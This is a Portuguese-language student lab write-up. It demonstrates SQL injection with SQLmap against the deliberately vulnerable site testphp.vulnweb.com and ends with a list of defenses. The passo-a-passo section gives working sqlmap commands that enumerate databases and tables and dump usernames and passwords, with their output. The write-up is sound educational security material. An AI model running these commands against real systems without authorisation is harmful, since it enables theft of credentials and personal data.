# Atividade 6.10 – SQL Injection com SQLmap

## Objetivo
Demonstrar o ataque SQL Injection utilizando a ferramenta SQLmap em um ambiente de testes legalmente autorizado.

## ⚠️ Aviso Legal
> O uso de SQLmap ou qualquer ferramenta de teste de intrusão em sistemas sem autorização prévia é **ilegal**. Esta atividade foi realizada exclusivamente no site `testphp.vulnweb.com`, que é um ambiente propositalmente vulnerável criado para fins educacionais.

---

## Conceito

### SQL Injection
O **SQL Injection** é uma vulnerabilidade que permite a um atacante inserir ou "injetar" comandos SQL maliciosos em consultas que uma aplicação envia ao banco de dados. Isso pode permitir:
- Leitura de dados confidenciais
- Modificação ou exclusão de dados
- Bypass de autenticação
- Execução de comandos no servidor

### SQLmap
O **SQLmap** é uma ferramenta open source que automatiza a detecção e exploração de vulnerabilidades de SQL Injection.

---

## Tipos de SQL Injection Testados

| Tipo | Descrição |
|------|-----------|
| **Boolean-based Blind** | Infere dados pela diferença de resposta com condições verdadeiras/falsas |
| **Time-based Blind** | Infere dados por atrasos na resposta do servidor |
| **UNION Query** | Combina resultados de duas consultas para extrair dados |
| **Error-based** | Explora mensagens de erro para obter informações |

---

## Passo a Passo

### 1. Identificar o alvo
Site de testes: `http://testphp.vulnweb.com/artists.php?artist=1`

### 2. Descobrir os bancos de dados
```bash
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs
```
**Resultado:**
```
available databases:
[*] acuart
[*] information_schema
```

### 3. Listar tabelas do banco acuart
```bash
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables
```
**Resultado:**
```
[8 tables]
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
```

### 4. Listar colunas de todas as tabelas
```bash
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --columns
```

### 5. Extrair dados da tabela users
```bash
# Extrair nome de usuário
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump

# Extrair senha
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass --dump
```

**Resultado:**
```
uname: test
pass: test
```

### 6. Testar autenticação
Acessar o site e fazer login com as credenciais obtidas.

---

## Tabela users - Dados Sensíveis Encontrados

| Coluna | Tipo | Observação |
|--------|------|------------|
| `uname` | varchar(100) | Nome de usuário |
| `pass` | varchar(100) | Senha (em texto plano!) |
| `cc` | varchar(100) | ⚠️ Número de cartão de crédito |
| `email` | varchar(100) | E-mail do usuário |
| `address` | mediumtext | Endereço físico |

---

## Como se Proteger

- Usar **prepared statements** (consultas parametrizadas)
- Validar e sanitizar todas as entradas do usuário
- Aplicar o princípio do **menor privilégio** no banco de dados
- Nunca armazenar senhas em texto plano (usar hashing)
- Implementar **WAF** (Web Application Firewall)

---

## Aprendizado
- SQL Injection é uma das vulnerabilidades mais comuns em aplicações web
- Ferramentas como SQLmap automatizam a exploração dessas vulnerabilidades
- Senhas e dados sensíveis nunca devem ser armazenados em texto plano
- Testes de segurança devem ser realizados apenas em ambientes autorizados
